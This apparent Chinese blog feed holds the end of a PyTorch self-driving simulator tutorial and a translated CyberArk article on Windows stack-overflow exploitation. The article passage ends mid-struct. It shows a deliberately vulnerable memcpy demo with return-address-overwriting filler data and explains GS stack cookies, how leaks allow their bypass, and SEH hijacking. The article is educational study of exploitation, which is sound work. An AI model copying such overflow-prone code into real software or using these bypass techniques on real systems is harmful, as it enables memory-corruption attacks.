计算误差</span></span><br><span class="line">            loss = criterion(pre_labels, labels)</span><br><span class="line">            MSEs.update(loss.item(), imgs.size(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出平均均方误差</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;MSE  &#123;mses.avg: .3f&#125;&#x27;</span>.<span class="built_in">format</span>(mses=MSEs))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;平均单张样本用时  &#123;:.3f&#125; 秒&#x27;</span>.<span class="built_in">format</span>((time.time() - start) / <span class="built_in">len</span>(val_dataset)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    程序入口</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="/.io//Snipaste_2022-05-01_12-49-31.png"></p><p>我们的转向角度取值范围是[-1, 1]，这样的误差比较小，是可以接受的。请注意多卡训练的同学，一定要解开nn.DataParallel的注释，否则是无法运行的。</p><p>这里等待的时间比较长，所以我增加了一些print输出来判断到底是电脑卡了还是程序在运行。同学们如果配置比较低，也建议这样自行增加一些print。</p><h3 id="3-5单张图片预测"><a href="#3-5单张图片预测" class="headerlink" title="3.5单张图片预测"></a>3.5单张图片预测</h3><p>为什么上一步已经用8000张图片进行预测了，这里还要用单张图片来尝试呢？真实的自动驾驶的时候，我们是要对每一张图片进行分析的。所以这里来尝试一下用单张图片来分析。</p><p>我们选取一张比较有代表性的图片:</p><p><img src="/.io//3976_0.2444.jpg"></p><p>大家可以先猜测一下这个转向角度。</p><p>下面是测试代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入OpenCV库</span></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 导入PyTorch库</span></span><br><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 导入自定义库</span></span><br><span class="line"><span class="keyword">from</span> models <span class="keyword">import</span> AutoDriveNet</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    主函数</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># 测试图像</span></span><br><span class="line">    imgPath = <span class="string">&#x27;./results/test.jpg&#x27;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 推理环境</span></span><br><span class="line">    device = torch.device(<span class="string">&quot;cuda&quot;</span> <span class="keyword">if</span> torch.cuda.is_available() <span class="keyword">else</span> <span class="string">&quot;cpu&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 加载训练好的模型</span></span><br><span class="line">    checkpoint = torch.load(<span class="string">&#x27;./results/checkpoint.pth&#x27;</span>)</span><br><span class="line">    model = AutoDriveNet()</span><br><span class="line">    model = model.to(device)</span><br><span class="line">    model.load_state_dict(checkpoint[<span class="string">&#x27;model&#x27;</span>],strict=<span class="literal">False</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 加载图像</span></span><br><span class="line">    img = cv2.imread(imgPath)</span><br><span class="line">    img = cv2.cvtColor(img, cv2.COLOR_BGR2HSV)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 图像预处理</span></span><br><span class="line">    <span class="comment"># PIXEL_MEANS = (0.485, 0.456, 0.406)  # RGB格式的均值和方差</span></span><br><span class="line">    <span class="comment"># PIXEL_STDS = (0.229, 0.224, 0.225)</span></span><br><span class="line">    img = torch.from_numpy(img.copy()).<span class="built_in">float</span>()</span><br><span class="line">    img /= <span class="number">255.0</span></span><br><span class="line">    <span class="comment"># img -= torch.tensor(PIXEL_MEANS)</span></span><br><span class="line">    <span class="comment"># img /= torch.tensor(PIXEL_STDS)</span></span><br><span class="line">    img = img.permute(<span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    img.unsqueeze_(<span class="number">0</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 转移数据至设备</span></span><br><span class="line">    img = img.to(device)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 模型推理</span></span><br><span class="line">    model.<span class="built_in">eval</span>()</span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">        prelabel = model(img).squeeze(<span class="number">0</span>).cpu().detach().numpy()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;预测结果  &#123;:.3f&#125; &#x27;</span>.<span class="built_in">format</span>(prelabel[<span class="number">0</span>]))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    程序入口</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>请注意一定要把测试的图片移动到result目录下，且命名为test.jpg，或修改代码中对应行。</p><p>测试结果：</p><p><img src="/.io//Snipaste_2022-05-01_13-03-45.png"></p><p>而实际上这台小车正准备右转，转向值为0.244。趋势上是正确的，而效果上也是可以接受的。</p><h3 id="3-6系统集成，自动驾驶"><a href="#3-6系统集成，自动驾驶" class="headerlink" title="3.6系统集成，自动驾驶"></a>3.6系统集成，自动驾驶</h3><p>我们现在可以使用pytorch逐帧分析图像，然后直接给出转向值用于小车控制，不再需要复杂的、分散的图像处理步骤。</p><p>只需要把上一小节的代码和之前的控制代码合并即可实现。编程能力强的同学可以留作练习。</p><p>运行auto_drive.py文件，其完整代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入系统库</span></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> gym</span><br><span class="line"><span class="keyword">import</span> gym_donkeycar</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 导入PyTorch库</span></span><br><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 导入自定义库</span></span><br><span class="line"><span class="keyword">from</span> models <span class="keyword">import</span> AutoDriveNet</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    主函数</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># 设置模拟器环境</span></span><br><span class="line">    env = gym.make(<span class="string">&quot;donkey-generated-roads-v0&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 设置推理环境</span></span><br><span class="line">    device = torch.device(<span class="string">&quot;cuda&quot;</span> <span class="keyword">if</span> torch.cuda.is_available() <span class="keyword">else</span> <span class="string">&quot;cpu&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 加载训练好的模型</span></span><br><span class="line">    checkpoint = torch.load(<span class="string">&#x27;./results/checkpoint.pth&#x27;</span>)</span><br><span class="line">    model = AutoDriveNet()</span><br><span class="line">    model = model.to(device)</span><br><span class="line">    model.load_state_dict(checkpoint[<span class="string">&#x27;model&#x27;</span>])</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 重置当前场景</span></span><br><span class="line">    obv = env.reset()</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 开始启动</span></span><br><span class="line">    action = np.array([<span class="number">0</span>, <span class="number">0.1</span>])  <span class="comment"># 动作控制，第1个转向值，第2个油门值</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 执行动作并获取图像</span></span><br><span class="line">    img, reward, done, info = env.step(action)</span><br><span class="line">    img = cv2.cvtColor(img, cv2.COLOR_RGB2HSV)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 运行5000次动作</span></span><br><span class="line">    model.<span class="built_in">eval</span>()</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5000</span>):</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 图像预处理</span></span><br><span class="line">        img = torch.from_numpy(img.copy()).<span class="built_in">float</span>()</span><br><span class="line">        img /= <span class="number">255.0</span></span><br><span class="line">        img = img.permute(<span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">        img.unsqueeze_(<span class="number">0</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 转移数据至设备</span></span><br><span class="line">        img = img.to(device)</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 模型推理</span></span><br><span class="line">        steering_angle = <span class="number">0</span></span><br><span class="line">        factor=<span class="number">1</span></span><br><span class="line">        <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">            <span class="comment"># 计算转向角度</span></span><br><span class="line">            steering_angle = (model(img).squeeze(<span class="number">0</span>).cpu().detach().numpy())[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> steering_angle*factor&lt;-<span class="number">1</span>:</span><br><span class="line">                steering_angle=-<span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> steering_angle*factor&gt;<span class="number">1</span>:</span><br><span class="line">                steering_angle=<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                steering_angle=steering_angle*factor</span><br><span class="line">            <span class="built_in">print</span>(steering_angle)</span><br><span class="line">            action = np.array([steering_angle, <span class="number">0.1</span>])  <span class="comment"># 油门值恒定</span></span><br><span class="line"> </span><br><span class="line">            <span class="comment"># 执行动作并更新图像</span></span><br><span class="line">            img, reward, done, info = env.step(action)</span><br><span class="line">            img = cv2.cvtColor(img, cv2.COLOR_RGB2HSV)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 运行完以后重置当前场景</span></span><br><span class="line">    obv = env.reset()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    主函数入口</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>从视频效果上看，通过深度学习的自动驾驶小车其操控流畅性感觉上超过了它的“师傅”OpenCV版本。可能的原因在于纯粹的OpenCV图像处理方法对每帧单独处理，没有一个整体的去噪概念，容易在某一帧出现偏差。但是基于深度学习的方法更多的是学习整个数据集的操作体验，某种意义上做了一定的概率去噪，或者说是平均化，因此，整个的操控才会显得更加流畅。</p><p>到这里，这个简单的教程就结束了。恭喜你，你已经入门了end to end自动驾驶(大概)。希望我的拙见可以帮助到大家学习。</p>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>栈溢出</title>
      <link href="/2024/02/04/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
      <url>/2024/02/04/%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows栈溢出"><a href="#Windows栈溢出" class="headerlink" title="Windows栈溢出"></a>Windows栈溢出</h1><p>原文链接：<a href="https://www.cyberark.com/resources/threat-research-blog/a-modern-exploration-of-windows-memory-corruption-exploits-part-i-stack-overflows">Windows 内存损坏漏洞的现代探索 – 第一部分：栈溢出 (cyberark.com)</a></p><p>代码地址：<a href="https://github.com/forrest-orr/ExploitDev">https://github.com/forrest-orr/ExploitDev</a></p><hr><p>前排提示：由于翻译的差异，“栈”与“堆栈”指的实际上是同一个东西，说的都是“stack”，然而，面向大多数刚刚接触编程的同学们，对于“堆”（heap）和“栈”的理解区分至关重要。因此，下文中应为“stack”的地方，统一称作“栈”，但难免有遗漏之处，请读者分清栈或堆栈与堆的区别，并海涵出现的疏忽。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>通过在现代操作系统上使用现代编译器记录自己的一些实验和研究来帮助解决过时的面向初学者的漏洞利用信息的问题。重点是Windows 10和Visual Studio 2019。</p><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在寄存器eip溢出后，塞入一段可让CPU执行的shellcode机器码，让电脑可以执行攻击者的任意指令。</p><p>shellcode可以按照攻击者执行的位置分为本地shellcode和远程shellcode。</p><h4 id="本地shellcode"><a href="#本地shellcode" class="headerlink" title="本地shellcode"></a>本地shellcode</h4><p>本地运行的shellcode经常用于利用软件漏洞提升权限。比如在Linux下由普通权限提升至root权限。</p><h4 id="远程shellcode"><a href="#远程shellcode" class="headerlink" title="远程shellcode"></a>远程shellcode</h4><p>利用软件漏洞获得特定的shellcode，再经由C或Python编写远程攻击程序，进而取得对方电脑的root权限。</p><h2 id="经典栈溢出"><a href="#经典栈溢出" class="headerlink" title="经典栈溢出"></a>经典栈溢出</h2><p>经典栈溢出是最容易理解的内存损坏漏洞。易受攻击的应用程序包含一个函数，该函数将用户控制的数据写入栈而不验证其长度。这允许攻击者：</p><ol><li>将shellcode写入栈。</li><li>覆盖当前函数的返回地址以指向shellcode。</li></ol><p>如果栈可以在不破坏应用程序的情况下以这种方式损坏，则shellcode将在被利用的函数返回时执行。此概念的示例如下：</p><p>(经过测试，运行这段代码需要在VS中关闭编译设置中的“缓冲区安全检查（GS）”选项)</p><p><img src="/.io//image-20230529140641266-1707050428582.png" alt="image-20230529140641266"></p><p>（我用的vs2022，就算关闭了这个选项它依然进行了缓冲区溢出检查，老版本也许能成功，成功运行后回报的错误应该是“无效的运行地址”，而不是栈溢出。）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdint&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> OverflowData[] =&#123;</span><br><span class="line"><span class="string">&quot;AAAAAAAAAAAAAAAA&quot;</span> <span class="comment">// 16个字节填充缓冲区</span></span><br><span class="line"><span class="string">&quot;BBBB&quot;</span>         <span class="comment">// +4 字节 覆盖安全cookie</span></span><br><span class="line"><span class="string">&quot;CCCC&quot;</span>         <span class="comment">// +4 字节 覆盖Ebp</span></span><br><span class="line"><span class="string">&quot;DDDD&quot;</span>&#125;;        <span class="comment">// +4 字节 覆盖返回地址</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Overflow</span><span class="params">(<span class="type">uint8_t</span>* pInputBuf, <span class="type">uint32_t</span> dwInputBufSize)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> Buf[<span class="number">16</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(Buf, pInputBuf, dwInputBufSize);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int32_t</span> <span class="title">wmain</span><span class="params">(<span class="type">int32_t</span> nArgc, <span class="type">const</span> <span class="type">wchar_t</span>* pArgv[])</span> </span>&#123;</span><br><span class="line">    _tprintf(_T(<span class="string">&quot;... passing %d bytes of data to vulnerable function\r\n&quot;</span>), <span class="built_in">sizeof</span>(OverflowData) - <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">Overflow</span>(OverflowData, <span class="built_in">sizeof</span>(OverflowData) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，安全cookie是一个在我们使用的栈下方加入的一个结构：</p><p><img src="/.io//../../../../OneDrive%20-%20office/OneDrive/%E6%96%87%E6%A1%A3%20%E7%AC%94%E8%AE%B0/%E6%A0%88%E6%BA%A2%E5%87%BA/20160419224637920" alt="这里写图片描述"></p><p>程序对cookie的值进行监测，一旦cookie中的值发生变化，则认为程序已经造成了栈溢出，立即退出程序并回报错误。如果在上一步中没有关闭，就会造成这样的结果：</p><p><img src="/.io//image-20230529140319202-1707050428583.png" alt="image-20230529140319202"></p><p><img src="/.io//image-20230529140802964-1707050428583.png" alt="image-20230529140802964"></p><p>栈溢出是一种技术（与字符串格式错误和堆溢出不同）仍然可以<strong>在现代Windows应用程序中利用</strong>，使用与几十年前发布的<a href="https://www.eecs.umich.edu/courses/eecs588/static/stack_smashing.pdf">Smashing the Stack for Fun and Profit</a>相同的方法。但是，现在适用于此类攻击的缓解措施已经非常强大了。</p><p>与字符串格式错误和堆溢出漏洞不同，对于栈溢出来说，攻击者仍然可以使用几十年前“Smashing the Stack for Fun and Profit”一文中提出的方法，来利用现代Windows应用程序中的这种漏洞。然而，现在针对这种攻击的缓解措施已经变得非常强大了。</p><p>在Windows 10上，默认情况下，使用Visual Studio 2019编译的应用程序将继承一组针对栈溢出漏洞的安全缓解措施，其中包括：</p><ol><li>SafeCRT</li><li>栈Cookie与安全的变量排序</li><li>安全的结构化异常处理（SafeSEH）</li><li>数据执行保护（DEP）</li><li>地址空间布局随机化（ASLR）</li><li>结构化异常处理覆盖保护（SEHOP）</li></ol><p>就算让易受攻击的CRT API（如strcpy）“退休”并通过SafeCRT库引入这些API的安全版本（如strcpy_s），也无法全面解决栈溢出的问题。这是因为像memcpy这样的API仍然有效，并且这些CRT API的非POSIX变体也是如此（例如KERNEL32.DLL!lstrcpyA）。当我们试图在Visual Studio 2019中编译包含这些“被退休”的API的应用程序时，会触发严重的编译错误，尽管这些错误是可抑制的。</p><p>栈Cookie是试图“修复”和防止栈溢出漏洞在运行时被利用的第一道防护机制。SafeSEH和SEHOP是在栈Cookie外围工作的两种缓解措复施，而DEP和ASLR并不是针对栈的缓解方法，因为它们并不能防止栈溢出攻击或EIP劫持的发生。相反，它们的作用提高通过这种攻击执行shellcode的难度。所有这些缓解措施都将随着本文的推进而深入探讨。下一节将重点讨论栈Cookie——目前我们在尝试利用栈溢出时的主要对手。</p><h2 id="栈Cookie、GS与GS"><a href="#栈Cookie、GS与GS" class="headerlink" title="栈Cookie、GS与GS++"></a>栈Cookie、GS与GS++</h2><p>随着Visual Studio 2003的发布，微软在其MSVC编译器中加入了一个新的栈溢出防御功能，称为GS。两年后，他们在发布Visual Studio 2005时默认启用了该功能。</p><p>关于GS，网上的信息虽然非常丰富，但是大部分都是过时的和&#x2F;或不完整的信息。之所以出现这种情况，是因为GS的安全缓解措施自最初发布以来已经发生了重大的变化：在Visual Studio 2010中，一个名为GS++的增强版GS取代了原来的GS功能。令人困惑的是，微软从未更新其编译器选项的名称，尽管实际上是GS++，但至今仍是“&#x2F;GS”。</p><p>从根本上说，GS其实是一种安全缓解措施，它被编译进二进制级别的程序，在包含Microsoft所谓的“GS缓冲区”（易受栈溢出攻击的缓冲区）的函数中放置策略性栈损坏检查（借助于栈Cookie）。最初的GS只考虑包含8个或更多元素，元素大小为1或2（字符和宽字符）字节的数组作为GS缓冲区，而GS++对此定义进行了实质性扩展，包括：</p><ol><li>任何数组(无论长度或元素大小)</li><li>结构体(无论其内容是什么)</li></ol><p><img src="/.io//Picture4-1707050428583.png" alt="img"></p><p>这个增强技术对现代栈溢出漏洞有很大的意义，因为它基本上使所有容易受到栈溢出攻击的函数免于受到基于返回地址的EIP劫持技术的影响。这反过来又会对其他陈旧的利用技术产生影响，比如通过部分EIP覆盖来绕过ASLR的技术——2007年著名的Vista CVE-2007-0038 Animated Cursor漏洞就利用结构溢出而流行起来的。随着2010年GS++的出现，在典型的栈溢出情况下，部分EIP覆盖作为ASLR绕过的方法已经失效。</p><p>MSDN上关于GS的信息（最后一次更新是在四年前的2016年），在GS覆盖率方面，与我自己的一些测试结果是相矛盾的。例如，微软将以下变量列为非GS缓冲区的例子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *pBuf[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *pv[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> buf[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> &#123; <span class="type">int</span> a; <span class="type">int</span> b; &#125;;</span><br></pre></td></tr></table></figure><p>然而在我自己使用VS2019进行的测试中，这些变量都会导致栈Cookie的产生。这说明GS确实被升级为了GS++，且作用域为上述的任何数组(无论长度或元素大小)、结构体(无论其内容是什么)。</p><p>究竟什么是栈Cookie，它们是如何工作的？</p><ol><li>栈Cookie在Visual Studio 2019中是默认设置的。它们可以使用&#x2F;GS标志进行配置，我们可以在项目设置的 Project -&gt; Properties -&gt; C&#x2F;C++ -&gt; Code Generation -&gt; Security Check字段中设置该标志。</li><li>当加载了一个用&#x2F;GS编译的PE时，它会初始化一个新的随机栈Cookie种子值，并将其作为一个全局变量存储在其.data段中。</li><li>每当一个包含GS缓冲区的函数被调用时，它都会将这个栈Cookie种子与EBP寄存器进行XOR运算，并将其存储在保存的EBP寄存器和返回地址之前的栈上。</li><li>在受保护的函数返回之前，它会再次用&gt;EBP对其保存的伪唯一性栈Cookie进行XOR运算，以获得原始的栈Cookie种子值，并进行相应的检查，以确保它仍然与存储在.data段的种子相匹配。</li><li>如果这个值不匹配，应用程序会抛出一个安全异常并终止执行。</li></ol><p>由于攻击者不可能在覆盖返回地址的同时不覆盖函数栈帧中保存的栈Cookie，这种机制能够阻止栈溢出漏洞利用代码通过RET指令劫持EIP，从而达到任意执行代码的目的。</p><p>在现代编译环境中编译并执行之前的栈溢出项目，会出现STATUS_STACK_BUFFER_OVERRUN异常(代码0xC0000409)；使用调试器可以逐步剖析其出错原因。</p><p><img src="/.io//image-20230529145619171-1707050428583.png" alt="image-20230529145619171"></p><p>我们可以看到，一顿开栈操作后，创建了一个位于0x057a028的安全栈cookie，并将这个地址<strong>里面的内容</strong>压入栈。这个内容正好占用的是四个字节。</p><p><img src="/.io//image-20230529150116415-1707050428583.png" alt="image-20230529150116415"></p><p>在memcpy函数返回之后，我们可以看到栈确实被我们的预期数据破坏了，其中包括返回地址EDX，现在已经变为0x44444444。在过去，当这个函数返回时，会出现访问冲突异常，并断言0x44444444是一个要执行的无效地址。但是，栈Cookie安全检查将阻止这种情况。</p><p><img src="/.io//image-20230529152344262-1707050428583.png" alt="image-20230529152344262"></p><p>首次执行该函数时，如果将存储在.data段中的栈Cookie种子与EBP进行XOR运算，然后将其保存到栈中。由于这个值在溢出期间将被值0x42424242所覆盖（如果我们希望能够覆盖返回地址并劫持EIP，这是不可避免的），从而生成有毒的栈Cookie值，即0xa33d2a88（在ECX中可以清楚看到），现在，该值将被传递给内部函数__security_check_Cookie进行验证。</p><p><img src="/.io//image-20230529153040701-1707050428583.png" alt="image-20230529153040701"></p><p>一旦这个函数被调用，就会导致STATUS_STACK_BUFFER_OVERRUN异常（代码0xC0000409）。这虽然会导致进程崩溃，但也防止了攻击者成功利用该漏洞。</p><p>当您熟悉这些概念和实际例子后，会注意到关于栈Cookie的几个“有趣”的事情：</p><ol><li>它们不能防止栈溢出的发生。攻击者仍然可以随心所欲地在栈上覆盖任意数量的数据。</li><li>它们只是针对每个函数的伪随机值。这意味着，如果.data中的栈Cookie种子发生内存泄漏，同时栈指针也发生泄漏，攻击者就可以准确地预测Cookie，并将其嵌入到其溢出中以绕过安全异常。</li></ol><p>从根本上来说（假设它们无法通过内存泄漏进行预测），栈Cookie只能防止我们通过易受攻击的函数的返回地址来劫持EIP。这意味着我们仍然可以以任何方式破坏栈，并能够在安全检查和RET指令之前执行任意代码。那么，这在现代栈溢出的可靠利用过程中有什么价值呢？</p><h2 id="SSH劫持"><a href="#SSH劫持" class="headerlink" title="SSH劫持"></a>SSH劫持</h2><p>进程中的每个线程都可以注册handler函数（默认情况下也是如此），以便在触发异常时进行调用。这些handler函数的指针通常存储在栈上的EXCEPTION_REGISTRATION_RECORD结构体中。在任何版本的Windows上启动一个32位应用程序时，都至少会注册一个这样的handler，并将相关数据存储在栈中，具体如下图所示：</p><p>(VS找不到，IDA也没有这个关键字，只能用别人的图了)</p><p><img src="/.io//../../../../OneDrive%20-%20office/OneDrive/%E6%96%87%E6%A1%A3%20%E7%AC%94%E8%AE%B0/%E6%A0%88%E6%BA%A2%E5%87%BA/v2-9fda65d79a3df60bdc1df9b7d99346f8_1440w.webp" alt="img"></p><p>上面高亮显示的EXCEPTION_REGISTRATION_RECORD结构体包含一个指向下一个SEH记录的指针（也存储在栈上），后面是指向handler函数的指针（在本例中是NTDLL.DLL库中的函数）。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_EXCEPTION_REGISTRATION_RECORD</span> 